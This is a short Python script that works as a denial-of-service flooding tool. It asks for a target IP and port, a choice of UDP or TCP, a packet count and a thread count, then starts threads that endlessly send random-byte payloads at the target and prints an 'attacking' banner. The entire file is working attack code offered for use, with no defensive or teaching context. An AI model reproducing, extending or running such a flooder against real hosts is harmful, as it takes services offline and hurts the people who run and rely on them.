import random
import socket
import threading
import os
import time
import sys

print(""" ### ###### #####  ### #####  ### #######
  #  #      #    #  #  #    #  #     #
  #  #      #    #  #  #    #  #     #
  #  ###### #####   #  #####   #     #
  #       # #       #  # #     #     #
  #       # #       #  #  #    #     #
 ### ###### #      ### #   #  ###    #
                                    """)
ip = str(input("IP/HOST╠════════>> "))
port = int(input("PORT╚═════════>> "))
choice = str(input("1.UDP/2.TCP╚═════════>> "))
times = int(input("BOTS╚═════════>>"))
threads = int(input("THREADS╚═════════>> "))

def run1(): #Udp-flood
  data = random._urandom(1000)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      
    except:
      print()

def run2(): #TCP FLOOD
  data = random._urandom(1024) #10240 10425 600000
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
                
        s.send(data)
    except:
            
        s.close() 

os.system("cls")
os.system("color c")
print ("""
                                           ╔═════════════════════════════════╗
                                           ║     Sucessfully To Attack!      ║ 
                                           ╚═════════════════════════════════╝
""")
print("""
                                        ╔═════════════════════════════════════════════╗
                                        ║               Attacking Info.               ║
                                        ║═════════════════════════════════════════════║ 
                                        ║ Attacking IP   : """ + (str(ip))  + """     ║ 
                                        ║ Attacking PORT : """ + (str(port)) + """    ║       
                                        ╚═════════════════════════════════════════════╝
""")

#Chocie Method Here and dont being idiot asf
for y in range(threads):
  if choice == '1':
    th = threading.Thread(target = run1)
    th.start()
  else:
         th = threading.Thread(target = run2)
         th.start()